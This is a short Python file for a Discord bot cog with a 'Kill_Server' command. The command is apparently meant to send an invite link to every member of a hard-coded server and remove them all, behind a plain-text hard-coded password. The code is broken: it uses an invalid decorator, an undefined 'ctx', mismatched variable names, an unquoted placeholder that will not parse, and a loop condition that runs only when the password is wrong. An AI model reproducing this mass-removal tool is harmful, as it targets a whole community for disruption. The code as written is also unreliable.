import discord
import emoji
from discord.ext import commands
client = discord.Client()
bot = commands.Bot(command_prefix = "!")
class events(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
    @commands.Cog.Command()
    async def Kill_Server():
        guild = bot.get_guild(547259564094128148)
        password = input("Password to execute this: ")
        while password != "1161600":
            for members in guild:
                ctx.send(PLACEHOLDER FOR INVITE LINK)
                member.remove(member)

def setup(bot):
    bot.add_cog(events(bot))
